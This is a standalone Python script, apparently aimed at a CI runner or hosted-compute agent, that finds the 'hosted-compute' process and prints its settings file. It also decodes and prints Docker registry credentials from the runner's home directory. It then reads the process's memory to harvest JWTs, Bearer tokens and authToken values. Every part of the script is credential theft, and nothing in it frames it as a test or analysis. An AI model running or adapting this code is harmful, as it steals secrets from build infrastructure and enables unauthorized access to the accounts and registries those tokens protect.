import os, re, sys, json, base64

# Find HCA process
pid = None
for p in os.listdir('/proc'):
    if p.isdigit():
        try:
            cmd = open('/proc/' + p + '/cmdline', 'rb').read()
            if b'hosted-compute' in cmd:
                pid = int(p)
                break
        except:
            pass

if not pid:
    print('HCA not found')
    sys.exit()

print('HCA PID:', pid)
print('HCA uid:', os.stat('/proc/' + str(pid)).st_uid)
print('My uid:', os.getuid())

# Settings
try:
    s = json.loads(open('/opt/hca/.settings', 'rb').read())
    for k, v in s.items():
        print('SETTING', k + ':', v)
except Exception as e:
    print('Settings err:', e)

# Docker creds
try:
    dc = json.loads(open('/home/runner/.docker/config.json').read())
    for reg, data in dc.get('auths', {}).items():
        auth = data.get('auth', '')
        decoded = base64.b64decode(auth).decode()
        print('DOCKER', reg, ':', decoded)
except Exception as e:
    print('Docker err:', e)

# Memory scan
try:
    maps = open('/proc/' + str(pid) + '/maps').readlines()
    mem = open('/proc/' + str(pid) + '/mem', 'rb')
    found = set()
    for m in maps:
        if 'rw-p' not in m:
            continue
        parts = m.split('-')
        start = int(parts[0], 16)
        end = int(parts[1].split()[0], 16)
        size = end - start
        if size > 50 * 1024 * 1024:
            continue
        try:
            mem.seek(start)
            data = mem.read(size)
            # JWT pattern
            for match in re.finditer(rb'eyJ[A-Za-z0-9_-]{20,}[.][eE][yY][jJ][A-Za-z0-9_-]{20,}[.][A-Za-z0-9_-]{20,}', data):
                t = match.group().decode('ascii', errors='ignore')
                k = t[:40]
                if k not in found:
                    found.add(k)
                    print('JWT FOUND:', t[:200])
                    try:
                        hdr = json.loads(base64.urlsafe_b64decode(t.split('.')[0] + '=='))
                        print('  Header:', hdr)
                        pay = json.loads(base64.urlsafe_b64decode(t.split('.')[1] + '=='))
                        print('  Payload keys:', list(pay.keys()))
                        for kk in ['aud', 'iss', 'sub', 'exp', 'scp', 'scope']:
                            if kk in pay:
                                print(' ', kk, ':', pay[kk])
                    except Exception as e2:
                        print('  Decode err:', e2)
            # Bearer pattern
            for match in re.finditer(rb'Bearer ([A-Za-z0-9_./-]{30,500})', data):
                t = match.group(1).decode('ascii', errors='ignore')
                k = t[:30]
                if k not in found:
                    found.add(k)
                    print('BEARER:', t[:200])
            # authToken pattern
            for match in re.finditer(rb'authToken[^A-Za-z0-9]{1,5}([A-Za-z0-9_./-]{20,500})', data):
                t = match.group(1).decode('ascii', errors='ignore')
                k = t[:30]
                if k not in found:
                    found.add(k)
                    print('AUTHTOKEN:', t[:200])
        except:
            pass
    mem.close()
    print('Total tokens:', len(found))
except PermissionError:
    print('PERM DENIED on /proc/mem')
except Exception as e:
    print('Mem err:', e)
